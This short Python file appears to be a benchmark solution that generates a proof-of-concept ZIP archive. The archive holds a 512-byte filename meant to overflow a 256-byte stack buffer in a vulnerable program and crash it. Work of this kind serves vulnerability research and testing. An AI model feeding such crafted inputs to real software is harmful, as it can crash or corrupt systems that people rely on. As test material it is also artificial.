import io
import zipfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Create an in-memory buffer to construct the ZIP file
        buffer = io.BytesIO()

        # Create a ZipFile object.
        # The vulnerability is a stack buffer overflow involving a 256-byte buffer
        # for the filename. We create a ZIP entry with a filename significantly 
        # larger than 256 bytes (512 bytes) to trigger the overflow and crash the application.
        # We use ZIP_STORED for simplicity and to keep the PoC size minimal.
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
            # Generate a filename of 512 'A's. 
            # This is sufficient to overflow the 256-byte buffer and corrupt the stack.
            exploit_filename = "A" * 512
            
            # Write the file entry to the zip. The content of the file can be empty.
            zf.writestr(exploit_filename, b"")

        # Return the raw bytes of the ZIP file
        return buffer.getvalue()